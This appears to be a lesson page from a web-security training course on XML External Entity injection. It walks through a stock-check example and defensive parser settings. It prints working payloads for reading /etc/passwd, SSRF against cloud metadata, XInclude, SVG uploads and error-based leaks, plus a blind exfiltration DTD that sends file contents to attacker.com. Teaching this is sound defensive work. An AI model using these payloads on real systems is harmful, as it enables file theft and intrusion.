---
title: XML External Entity (XXE) Injection · Case File 17 (The Parser Trap)
description: Trace how legacy XML document type definitions (DTDs) turn file readers into internal spies, master blind exfiltration via parameter entities, and explore safe XML parsing.
---

# XML External Entity (XXE) Injection · The Parser Trap Investigation

<p class="wd-section-lede">XML External Entity (XXE) injection is a classic example of an application feature that is simply too powerful for its own good. XML was designed in the 1990s with built-in features that allow a document to define custom text shortcuts called "entities." When an application accepts XML from users without disabling external entity resolution, the XML parser can be instructed to read confidential files directly off the server's hard drive or initiate internal network requests.</p>

<div class="wd-callout">
<p><strong>💡 Everyday Analogy: The Over-Helpful Mail Merge.</strong> Imagine you write a letter in Microsoft Word and define a shortcut macro: <em>"Whenever you see the word '[MY_SIGNATURE]', don't print that word—instead, open the file 'C:\MyDocuments\signature.png' and paste it in."</em> That's normal mail-merge convenience. But now imagine an outsider sends your office a document that says: <em>"Whenever you see '[REPLY]', open 'C:\Vault\Passwords.txt' and email it to my address."</em> If your printer blindly executes that macro, you have an XXE flaw. An XML parser does the exact same thing when external entities are enabled.</p>
</div>

---

## Case File #17: The XML Inventory Check

Let's investigate how a standard XML-based stock checking feature can be turned into an arbitrary file reader.

<div class="wd-case">
  <div class="wd-step wd-step--see">
    <span class="wd-step__tag">🔎 Step 1 · What You Notice in the Browser</span>
    <p>You visit an online shop and click <strong>Check stock</strong>. In your proxy, you notice the browser sends an XML document in the POST request body:</p>
    <div class="language-xml"><pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;stockCheck&gt;
  &lt;productId&gt;381&lt;/productId&gt;
  &lt;storeId&gt;1&lt;/storeId&gt;
&lt;/stockCheck&gt;</code></pre></div>
    <p>The server replies with the stock count: <code>"92 units available"</code>.</p>
  </div>

  <div class="wd-step wd-step--server">
    <span class="wd-step__tag">⚙️ Step 2 · What the Server Does Behind the Scenes</span>
    <p>The backend hands this XML text to a standard XML parser (such as Java's <code>DocumentBuilderFactory</code> or PHP's <code>libxml</code>). The parser builds an in-memory document tree so the application can read the <code>productId</code>:</p>
    <div class="wd-codesplit">
      <div class="wd-codesplit__legend">
        <span><span class="wd-code-dev">Blue</span> = XML Document Structure</span>
        <span><span class="wd-code-input">Gold</span> = Parameter Value From Client</span>
      </div>
      <span class="wd-code-dev">&lt;stockCheck&gt;&lt;productId&gt;</span><span class="wd-code-input">381</span><span class="wd-code-dev">&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;</span>
    </div>
  </div>

  <div class="wd-step wd-step--break">
    <span class="wd-step__tag">💥 Step 3 · Where the Logic Breaks</span>
    <p>Because the XML parser has default historical features enabled, it accepts a custom <code>&lt;!DOCTYPE&gt;</code> definition with an <Term id="xxe-external-entity">external entity</Term> pointing to a local system file: <code>&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;</code>. When you reference <code>&amp;xxe;</code> inside <code>&lt;productId&gt;&amp;xxe;&lt;/productId&gt;</code>, the parser reads <code>/etc/passwd</code> off the server's disk and inserts the file contents right into the document!</p>
  </div>

  <div class="wd-step wd-step--fix">
    <span class="wd-step__tag">🛡️ Step 4 · How Developers Lock It Down</span>
    <p>Developers harden their XML parser configurations. By disabling Document Type Declarations entirely (<code>disallow-doctype-decl = true</code>) or turning off external general and parameter entities, the parser refuses to resolve external URIs. Even better, modern architectures migrate APIs to JSON, which has no entity resolution features.</p>
  </div>
</div>

### Visual Comparison: Static Numbers vs. Dynamic File Inclusion

<div class="wd-compare">
  <div class="wd-compare__card wd-compare__card--expect">
    <span class="wd-compare__title">💭 What the Developer Expected</span>
    <p>The developer thought the XML body would only ever carry numerical product and store IDs (e.g. <code>381</code> and <code>1</code>) to query inventory records in the database.</p>
  </div>
  <div class="wd-compare__card wd-compare__card--actual">
    <span class="wd-compare__title">💥 What Actually Happened</span>
    <p>The client injected a <code>DOCTYPE</code> declaration with an external entity pointing to <code>file:///etc/passwd</code>. The parser fetched the file contents and reflected system user accounts in the application response.</p>
  </div>
</div>

### Watch the XML Payload Expand Color by Color

See how the parser swaps out the entity reference with the contents of the target file:

<div class="wd-codesplit">
  <div class="wd-codesplit__legend">
    <span><span class="wd-code-dev">Blue</span> = Application XML Template</span>
    <span><span class="wd-code-input">Gold</span> = Injected DTD &amp; Entity Reference</span>
  </div>
  <span class="wd-code-input">&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;</span><br>
  <span class="wd-code-dev">&lt;stockCheck&gt;&lt;productId&gt;</span><span class="wd-code-input">&amp;xxe;</span><span class="wd-code-dev">&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;</span>
</div>

---

## The 4-Stage Journey of an XML Parser

Understanding the exact sequence of how an XML parser interprets a document clarifies why external entities execute:

<div class="wd-flow">
  <div class="wd-flow__node">
    <strong>1. Raw XML Stream</strong>
    Web app receives incoming HTTP body containing custom <code>&lt;!DOCTYPE&gt;</code>.
  </div>
  <span class="wd-flow__arrow">→</span>
  <div class="wd-flow__node wd-flow__node--danger">
    <strong>2. DTD Resolution</strong>
    Parser identifies <code>SYSTEM "file:///etc/passwd"</code> and opens the operating system file.
  </div>
  <span class="wd-flow__arrow">→</span>
  <div class="wd-flow__node">
    <strong>3. Entity Replacement</strong>
    Parser replaces the <code>&amp;xxe;</code> token with the loaded file text in memory.
  </div>
  <span class="wd-flow__arrow">→</span>
  <div class="wd-flow__node wd-flow__node--safe">
    <strong>4. Document Evaluation</strong>
    Application processes the XML tree, reflecting the file contents in the error or output.
  </div>
</div>

---

## The Anatomy of an XML Entity

XML allows documents to define shorthand variables called entities. Here are the components you need to know:

```xml
<!DOCTYPE test [
  <!ENTITY author "John Doe">
  <!ENTITY file SYSTEM "file:///etc/passwd">
  <!ENTITY % oob SYSTEM "http://attacker.com/evil.dtd">
]>
```

1. **Internal General Entity (`&author;`):** A simple macro. Everywhere `&author;` appears in the XML body, it is replaced by `"John Doe"`.
2. **External General Entity (`&file;`):** Instructs the parser to fetch the resource located at the URI (using schemes like `file://` or `http://`) and insert its content into the document body.
3. **Parameter Entity (`%oob;`):** Defined with a `%` symbol. Parameter entities can **only** be evaluated inside the DTD itself—which makes them the foundational building block for blind out-of-band exfiltration!

::: details 🔬 Under the Hood: Why Was `SYSTEM` Ever Allowed?
In the early days of XML (XML 1.0 standard, 1998), documents were frequently split into multiple modular files. For example, a legal contract might include a shared company header from `SYSTEM "http://corporate.internal/header.dtd"`.

Because parsers were expected to download shared definitions automatically, external entity loading was turned **on by default**. The security flaw is not a bug in the parser—it is an unsafe default configuration running on untrusted public input.
:::

---

## Direct In-Band File Disclosure

When the application parses your XML document and reflects the contents of the element back into the HTTP response (such as in an error message like "Product `&xxe;` not found"), the file contents appear directly on your screen.

<LabGroup ids="xxe-lab-exploiting-xxe-to-retrieve-files" />

---

## Pivoting from XXE to SSRF

An XML external entity doesn't have to point to a local file (`file://`). It can also point to network protocols:

```xml
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

When the parser processes this document, the server makes an HTTP GET request to the link-local cloud metadata service. The parser captures the HTTP response and pastes it into the document, turning the XML parser into an internal SSRF proxy!

<LabGroup ids="xxe-lab-exploiting-xxe-to-perform-ssrf" />

---

## Blind XXE: Out-of-Band Exfiltration with Parameter Entities

What happens if the application never prints the parsed XML values anywhere on the screen? You cannot see the file contents in-band.

To solve this, you use **Parameter Entities** (`%name;`) and an external malicious DTD hosted on your server:

```xml
<!-- Attacker XML payload sent to the victim -->
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

Your hosted `evil.dtd` contains a two-stage instruction:
```xml
<!-- Hosted on http://attacker.com/evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

### How the Two-Stage Parameter Entity Works:
1. `%file;` reads `/etc/passwd` from the victim's disk.
2. `%eval;` dynamically creates a new entity definition (`%exfil;`) containing the file contents in the URL parameter.
3. `%exfil;` forces the parser to make an outbound HTTP request to `http://attacker.com/?data=root:x:0:0:...`.
4. Your server logs capture the sensitive file contents!

<LabGroup ids="xxe-lab-xxe-with-out-of-band-interaction, xxe-lab-xxe-with-out-of-band-interaction-using-parameter-entities, xxe-lab-xxe-with-out-of-band-exfiltration" />

---

## Error-Based XXE: When Outbound Traffic is Blocked

What if the target server is behind a strict egress firewall that blocks all outbound HTTP connections to attacker-controlled domains?

You can force the XML parser to generate an error message that includes the contents of the secret file!

```xml
<!-- Injected external or local DTD trigger -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

When the parser attempts to load `file:///nonexistent/root:x:0:0:...`, the operating system fails because the file does not exist, and the parser prints an error:
`java.io.FileNotFoundException: /nonexistent/root:x:0:0:daemon:x:1:1:... (No such file or directory)`. The file contents are leaked inside the error message!

<LabGroup ids="xxe-lab-xxe-with-data-retrieval-via-error-messages, xxe-lab-xxe-trigger-error-message-by-repurposing-local-dtd" />

---

## Attacking Partial XML Inputs with XInclude

Sometimes a web application takes your input and embeds it into a server-side XML document before parsing it. Because you only control a single parameter (like `productId=1`), you cannot define a `<!DOCTYPE>` at the top of the document.

In this scenario, you can use **XInclude** (XML Inclusions). XInclude is an XML standard that allows a document to incorporate content from another file without declaring a `DOCTYPE`:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

Submitting this snippet directly into the vulnerable field causes the parser to include `/etc/passwd` as plain text at that exact location.

<LabGroup ids="xxe-lab-xinclude-attack" />

---

## Hidden XML Vectors: SVG Avatar Uploads

Many applications that do not seem to accept XML still parse XML under the hood! The most common culprit is **SVG image uploads**.

An SVG (Scalable Vector Graphics) file is not a binary bitmap—it is a plain-text XML document. If an application allows users to upload profile pictures in SVG format, an attacker can embed an XXE payload inside the image:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
<svg width="200px" height="200px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

When the server renders the SVG image or converts it to PNG, the file contents are rendered directly onto the image canvas!

<LabGroup ids="xxe-lab-xxe-via-file-upload" />

::: details ⚙️ Engine Variations: Parser Hardening Across Stacks
- **Java (`DocumentBuilderFactory`):** Must set `disallow-doctype-decl = true`, `external-general-entities = false`, and `external-parameter-entities = false`.
- **PHP (`libxml`):** `libxml_disable_entity_loader(true)` was common in PHP 7; PHP 8 disables external entity loading by default.
- **.NET (`XmlReader`):** Modern .NET sets `XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit` by default. Legacy code using `XmlDocument` remains vulnerable unless explicitly hardened.
- **Python:** Standard `xml.etree.ElementTree` is vulnerable to entity expansion attacks; use `defusedxml` for secure parsing.
:::

---

## Defensive Blueprint: How to Neutralize XXE

Preventing XXE vulnerabilities is straightforward once you know which parser switches to flip:

<div class="wd-callout wd-callout--warn">
<p><strong>🛡️ The 3 Rules of Safe XML Parsing:</strong></p>
<ol>
  <li><strong>Disable DTDs entirely:</strong> Configure your parser with <code>http://apache.org/xml/features/disallow-doctype-decl = true</code>. If the parser is forbidden from reading <code>&lt;!DOCTYPE&gt;</code>, all XXE and entity attacks fail immediately.</li>
  <li><strong>Disable external entities and DTD loading:</strong> If DTDs cannot be completely disabled, explicitly turn off external general entities, external parameter entities, and external DTD loading.</li>
  <li><strong>Sanitize or rasterize file uploads:</strong> If accepting SVG images, rasterize them in an isolated sandbox or strip all XML entity declarations before processing.</li>
</ol>
</div>

<TopicComplete topic-id="xml-external-entity-xxe-injection" label="Mark XXE complete" />
